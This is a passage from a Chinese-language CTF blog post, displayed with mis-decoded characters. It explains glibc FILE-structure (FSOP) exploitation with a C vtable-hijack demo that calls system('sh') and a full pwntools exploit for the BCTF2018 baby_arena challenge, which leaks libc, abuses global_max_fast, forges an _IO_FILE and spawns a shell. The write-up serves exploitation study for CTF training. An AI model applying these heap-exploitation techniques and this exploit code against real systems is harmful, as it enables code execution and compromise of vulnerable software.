(do_abort=do_abort@entry=<span class="hljs-number">0x2</span>, fmt=fmt@entry=<span class="hljs-number">0x7ffff7ba0d58</span> <span class="hljs-string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)<br>malloc_printerr (action=<span class="hljs-number">0x3</span>, str=<span class="hljs-number">0x7ffff7ba0e90</span> <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)<br>_int_free (av=<span class="hljs-number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="hljs-number">0x0</span>)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="exit-æ ˆå›æº¯"><a class="header-anchor" href="#exit-æ ˆå›æº¯">Â¶</a>exit æ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="æ­£å¸¸é€€å‡ºæ ˆå›æº¯"><a class="header-anchor" href="#æ­£å¸¸é€€å‡ºæ ˆå›æº¯">Â¶</a>æ­£å¸¸é€€å‡ºæ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>__libc_start_main (main=<span class="hljs-number">0x400526</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><p>çœ‹å‡ºæ¥ç¨‹åºæ˜¯åœ¨<strong>æ­£å¸¸ä»mainå‡½æ•°è¿”å›å</strong>ï¼Œè°ƒç”¨äº†<code>exit</code>å‡½æ•°ï¼Œæ‰€ä»¥æœ€ç»ˆæ‰è°ƒç”¨<code>_IO_flush_all_lockp</code>å‡½æ•°çš„ã€‚æ‰€ä»¥å¦‚æœç”¨ <code>syscall</code> ç»“æŸé‚£å°±ä¸è¡Œã€‚</p><p>å¸¸è§çš„åˆ©ç”¨çš„æ–¹å¼ä¸ºâ€”â€”</p><p>ä¼ªé€ IO FILEç»“æ„ä½“ï¼Œå¹¶åˆ©ç”¨æ¼æ´å°†<code>_IO_list_all</code>æŒ‡å‘ä¼ªé€ çš„ç»“æ„ä½“ï¼Œæˆ–æ˜¯å°†è¯¥é“¾è¡¨ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆ<code>_chain</code>å­—æ®µï¼‰æŒ‡å‘ä¼ªé€ çš„æ•°æ®ï¼Œå†æˆ–è€…ç›´æ¥ ğŸ‘ æ‰åŸæœ¬çš„ IO ç»“æ„ä½“ã€‚</p><p>æœ€ç»ˆè§¦å‘<code>_IO_flush_all_lockp</code>ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ ç»“æ„ä½“ç»•è¿‡ä¸€å †æ£€æŸ¥ï¼Œè°ƒç”¨<code>_IO_OVERFLOW</code> ç­‰å‡½æ•°æ—¶å®ç°æ‰§è¡Œ<strong>æµåŠ«æŒ</strong>ã€‚æ„æ€æ˜¯ä½ å¯ä»¥åˆæ³•åœ°æ„é€ å¤šä¸ª <strong>_chain</strong> æŠŠ IO <strong>æ‘åœ¨ exit ç­‰å‡½æ•°é€€å‡ºå‰åå¤æ‘©æ“¦</strong>ï¼ˆç¬‘ï¼‰ã€‚ ğŸ‘´ å°±æ˜¯çˆ±äº†è¿™ä¸€ç‚¹ã€‚</p><p>å…¶ä¸­ç»•è¿‡æ£€æŸ¥è¿›å…¥<code>_IO_OVERFLOW</code>çš„æ¡ä»¶æ˜¯è¾“å‡ºç¼“å†²åŒºä¸­å­˜åœ¨æ•°æ®ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"> <span class="hljs-function"><span class="hljs-title">if</span> (((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base)<br>#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T<br>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>         &amp;&amp; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>            &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base))<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¼ªé€ çš„è¯ï¼Œæˆ‘ä»¬åªéœ€è¦å¦‚ä¸‹æ“ä½œå°±å¯ä»¥ç»•è¿‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><hr><h1>åˆ©ç”¨è‰ºæœ¯é‰´èµ</h1><h2 id="Libc-2-23"><a class="header-anchor" href="#Libc-2-23">Â¶</a>Libc &lt;= 2.23</h2><h3 id="åŠ«æŒ-vtable"><a class="header-anchor" href="#åŠ«æŒ-vtable">Â¶</a>åŠ«æŒ vtable</h3><p>è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œä¸Šé¢æœ‰è¯´åˆ° vtable æ˜¯ä¸€å¼ ä¸å¯»å¸¸çš„è¡¨ï¼Œå¾ˆå¤š io ç›¸å…³å‡½æ•°éƒ½ä¼šè°ƒç”¨å®ƒã€‚é‚£ä¹ˆ ğŸ‘´ åªè¦åŠ«æŒäº† vtableï¼Œ ğŸ‘ æ‰æŸä¸ª IO å‡½æ•°ä¸­å…³é”®çš„å‡½æ•°æŒ‡é’ˆï¼Œæ¢æˆ ğŸ‘´ æœ€çˆ±çš„ system ï¼Œå°±èƒ½æäº‹æƒ…äº†ã€‚</p><h4 id="Demo"><a class="header-anchor" href="#Demo">Â¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥æ‰¬å®Œäº†æ˜¯å› ä¸º fwrite è°ƒç”¨äº†<code>_IO_new_file_xsputn</code> è¿™ä¸ªå‡½æ•°ï¼Œè€Œ rdi é»˜è®¤å°±æ˜¯æˆ‘ä»¬çš„ fp ç»“æ„ä½“ï¼Œæ‰€ä»¥æœ€åçš„æ•ˆæœæ˜¯ <code>system('sh\0');</code>ã€‚</p><h3 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h3><h4 id="baby-arena-BCTF2018-libc2-23"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-23">Â¶</a>baby_arena_BCTF2018 &lt;libc2.23&gt;</h4><p>é¢˜ç›®å¯ä»¥<a href="https://github.com/caffelne/caffelne.github.io/tree/master/chals/IOFILE/baby_arena_BCTF2018">ç‚¹å‡»</a>ä¸‹è½½æˆ–è€…å»åŸæ–‡ <a href="https://fmyy.pro/2020/04/04/GMF/Global_Max_Fast/">è‚¥çŒ«å˜¤å˜¤â€™s åšå®¢</a></p><h5 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h5><p>ç¬¬ä¸€é¢˜å°±å†™è¯¦ç»†ç‚¹ã€‚èœå•å®ç°äº† <code>allocate</code> ï¼Œ<code>delete</code> ï¼Œ<code>login</code> ä¸‰ä¸ªåŠŸèƒ½ã€‚</p><p>æ¼æ´ç‚¹å‡½æ•° <strong>login</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// eax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  __int64 *v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = &amp;user;<br>  <span class="hljs-keyword">if</span> ( flag )<br>  &#123;<br>    LODWORD(v0) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you are already login&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your name&quot;</span>);<br>    get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br>    user = v3;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice type&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0.clientele&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.admin&quot;</span>);<br>    num = get_num(<span class="hljs-string">&quot;1.admin&quot;</span>, <span class="hljs-number">16LL</span>);<br>    <span class="hljs-keyword">if</span> ( num )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      *((_DWORD *)v4 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;imda&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;n&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      v4[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;letneilc&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">4</span>) = <span class="hljs-string">&#x27;e&#x27;</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªæº¢å‡ºï¼Œå¯ä»¥è¦†å†™ v4 ï¼Œå¯¼è‡´ä»»æ„åœ°å€å†™ <code>admin</code> æˆ–è€… <code>clientele</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br></code></pre></td></tr></table></figure><h5 id="Global-Max-Fast"><a class="header-anchor" href="#Global-Max-Fast">Â¶</a>Global_Max_Fast</h5><p>è¿™é‡Œä¹Ÿé¡ºå¸¦è®²ä¸€ä¸‹ <code>Global_Max_Fast</code> è¿™ä¸ªç©æ„ï¼Œx64 ä¸‹è¿™ä¸ªä¸œè¥¿é€šå¸¸ä¸º <code>0x80</code> ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶çœ‹åˆ°çš„æœ€å¤§ fastbin çš„å¤§å°ã€‚</p><p>åˆ©ç”¨ç‚¹å°±åœ¨æˆ‘ä»¬ free  ğŸ‘ æ‰ä¸€ä¸ª fastbin èŒƒå›´å†…çš„å †å—æ—¶ï¼Œåœ¨ <strong>main_arena</strong> çš„å¯¹åº” size çš„å‘ä½ä¼šè®°å½•å †å—çš„åœ°å€ã€‚ä½†æˆ‘ä»¬å¤§å°æ”¹çš„å·¨å¤§çš„æ—¶å€™ï¼Œå‘ä½ä¸å¤Ÿä½†æ˜¯ glibc è¿™ä¸ªç¬¨æ¯”å®ƒåˆä¸æ‡‚ï¼Œå°±ä¼šé€ æˆæŠŠ <strong>main_arena</strong> å¾€åçš„å¯¹åº”åç§»ä½ç½®çš„å†…å®¹<strong>å†™æˆæˆ‘ä»¬çš„å †å—åœ°å€</strong>ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å…¬å¼æ¥è®¡ç®—å‡ºç›®æ ‡æº¢å‡ºä½ç½®ï¼Œå¯¹åº”çš„éœ€è¦æ„é€ çš„å †å— SIZEï¼Œå…¶ä¸­çš„ delta æŒ‡çš„æ˜¯æº¢å‡ºä½ç½®åˆ° fastbinsY é¦–åœ°å€çš„å·®å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">chunk size = (delta * <span class="hljs-number">2</span>) + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ malloc çš„å¤§å°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">offset2size</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">assert</span> offset % <span class="hljs-number">8</span> == <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> (offset * <span class="hljs-number">2</span>) + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>ğŸ‘´ æ„¿ç§°ä¹‹ä¸º<strong>éœ¸å ä½ çš„å‘ä½ç„¶åç–¯ç‹‚å¡ğŸ’©</strong>ã€‚æ— å›¾è¨€é¸¾ï¼š</p><p>ä¸€å¼€å§‹è¿˜æ²¡ free çš„æ—¶å€™æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175248002.png" alt="image-20220524175248002"></p><p>free å®Œä¹‹åæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175336933.png" alt="image-20220524175336933"></p><p>æº¢å‡ºçš„æƒ…å½¢ï¼Œè°ƒè¯•éƒ¨åˆ†å†å†™ã€‚</p><h5 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">Â¶</a>æ€è·¯</h5><ol><li>ç®€å•çš„ Leak libc ä¹‹ååˆ©ç”¨ä»»æ„å†™åœ¨ <code>global_max_fast</code> ä¸Šå†™ <code>admin</code>  æ”¹å¤§æˆ‘ä»¬çš„ fastbin å¤§å°ã€‚</li><li>ç®—å¥½åç§»æŠŠæˆ‘ä»¬çš„å †å—é€åˆ° <code>_IO_list_all</code> çš„å‘ä¸Šå»ï¼Œä¼ªé€  <code>_IO_FILE</code> çš„ <strong>vtable</strong> å <code>exit</code> è§¦å‘ <code>FSOP</code> å°±ç»“æŸäº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ vtable æ˜¯ä¸€å¼ å‡½æ•°è¡¨ï¼Œæˆ‘ä»¬ä¸ºäº†ç®€å•çš„å®šä½æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ã€‚é€‰æ‹©åˆ©ç”¨ <strong>login</strong> å‡½æ•°åŒæ—¶åœ¨ bss æ®µå†™ä¸Š onegadgetã€‚</li><li>è¿™éƒ¨åˆ†å¹¶ä¸å¤æ‚,å…·ä½“çš„æˆ‘å†™åœ¨ä¸‹é¢çš„è°ƒè¯•æ­¥éª¤äº†ã€‚</li></ol><h5 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.23/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1400</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3c4b78</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>,one_gadget)<br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3c37a0</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br>aw(one_gadget,libc_base+<span class="hljs-number">0x3c67f8</span>-<span class="hljs-number">8</span>)<br>pause()<br><br>dele(<span class="hljs-number">1</span>)<br><br>fake_IO = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x1400</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="è°ƒè¯•"><a class="header-anchor" 